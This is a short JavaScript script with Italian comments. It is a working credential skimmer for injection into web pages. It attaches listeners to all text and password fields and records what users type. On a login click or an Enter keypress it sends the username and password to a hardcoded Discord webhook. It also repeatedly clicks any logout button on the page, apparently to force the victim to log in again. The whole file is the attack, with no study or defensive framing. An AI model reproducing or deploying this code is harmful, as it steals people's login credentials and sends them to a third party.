(() => {
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1464601261285441796/GyzuKtD3fqFle-8k5Nc5S0xtEBXpXnLdrqnuv5WMtISLWlFPwDA2sAi6C5iZF4aFxgWl';

  let username = null;
  let password = null;
  let sent = false;

  // --- INVIO DATI ---
  function sendData() {
    if (sent) return;
    if (username && password) {
      sent = true;
      fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: JSON.stringify({
            username,
            password,
            time: new Date().toISOString()
          }, null, 2)
        })
      });
      console.log("[Webhook] Dati inviati!");
    }
  }

  // --- GESTIONE INPUT ---
  function handleInput(input) {
    const name = (input.name || '').toLowerCase();
    const type = input.type;

    if (!input.value) return;

    // Aggiorna sempre il valore completo
    if (name.includes('username') || type === 'text') {
      username = input.value;
    }

    if (name.includes('password') || type === 'password' || type === 'password') {
      password = input.value;
    }
  }

  function attach(input) {
    handleInput(input);
    input.addEventListener('input', () => handleInput(input));
    input.addEventListener('change', () => handleInput(input));
    input.addEventListener('paste', () => setTimeout(() => handleInput(input), 0));
  }

  function scan(root = document) {
    root.querySelectorAll('input').forEach(input => {
      if (
        input.type === 'text' ||
        input.type === 'password' ||
        input.name?.toLowerCase().includes('username') ||
        input.name?.toLowerCase().includes('password')
      ) {
        attach(input);
      }
    });
  }

  scan();

  new MutationObserver(mutations => {
    mutations.forEach(m =>
      m.addedNodes.forEach(n => {
        if (n.nodeType === 1) scan(n);
      })
    );
  }).observe(document.body, { childList: true, subtree: true });

  // --- LISTENER PER LOGIN / ENTER ---
  document.addEventListener('click', e => {
    const btn = e.target.closest('button, input[type="submit"]');
    if (!btn) return;

    const text = (btn.innerText || btn.value || '').toLowerCase();
    if (text.includes('login') || text.includes('entra')) {
      sendData();
    }
  });

  document.addEventListener('keypress', e => {
    if (e.key === 'Enter') {
      sendData();
    }
  });

  // --- AUTO LOGOUT ---
  if (window.logoutDone === undefined) {
    window.logoutDone = false;
  }

  if (window.autoLogoutInterval) {
    clearInterval(window.autoLogoutInterval);
  }

  window.autoLogoutInterval = setInterval(function () {
    if (window.logoutDone) return;

    var logoutBtn =
      document.querySelector('button.logout') ||
      document.querySelector('a.logout') ||
      document.querySelector('#logout') ||
      document.querySelector('[onclick*="logout"]');

    if (logoutBtn) {
      logoutBtn.click();
      window.logoutDone = true;
      clearInterval(window.autoLogoutInterval);
      console.log("[AutoLogout] Logout automatico eseguito");
    }
  }, 1000);

  // Timeout di sicurezza
  setTimeout(function () {
    if (!window.logoutDone) {
      clearInterval(window.autoLogoutInterval);
      console.log("[AutoLogout] Logout non trovato (timeout)");
    }
  }, 60000);

})();
